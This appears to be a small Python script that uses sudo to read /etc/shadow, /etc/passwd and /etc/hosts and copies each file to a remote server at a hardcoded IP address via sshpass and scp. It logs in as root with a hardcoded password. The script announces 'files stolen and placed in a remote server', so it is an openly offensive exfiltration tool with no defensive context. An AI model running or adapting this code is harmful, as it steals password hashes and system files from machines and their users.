import argparse
import requests
import subprocess
import socket
import os

files = ["/etc/shadow", "/etc/hosts", "/etc/passwd"]
def main(serverIP: str): 
    for x in files: 
        subprocess.call("sudo cat " + x + " > file.txt && sudo sshpass -p kolakoala123 scp " + x + " root@172.238.240.38:/home", shell=True)
    return "files stolen and placed in a remote server"
print(main("172.238.240.38"))